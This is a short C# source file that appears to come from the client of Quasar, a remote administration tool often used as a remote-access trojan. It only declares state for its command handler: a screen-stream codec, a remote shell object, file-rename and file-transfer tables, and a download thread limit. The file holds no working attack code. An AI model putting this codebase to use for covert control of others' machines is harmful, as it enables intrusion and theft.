using System.Collections.Concurrent;
using Quasar.Client.Utilities;
using Quasar.Common.IO;
using Quasar.Common.Video.Codecs;
using System.Collections.Generic;
using System.Threading;

namespace Quasar.Client.Commands
{
    /* THIS PARTIAL CLASS SHOULD CONTAIN VARIABLES NECESSARY FOR VARIOUS COMMANDS (if needed). */
    public static partial class CommandHandler
    {
        public static UnsafeStreamCodec StreamCodec;
        private static Shell _shell;
        private static readonly Dictionary<int, string> RenamedFiles = new Dictionary<int, string>();
        private static readonly ConcurrentDictionary<int, FileSplit> ActiveTransfers = new ConcurrentDictionary<int, FileSplit>();
        private static readonly Semaphore LimitThreads = new Semaphore(2, 2); // maximum simultaneous file downloads
    }
}
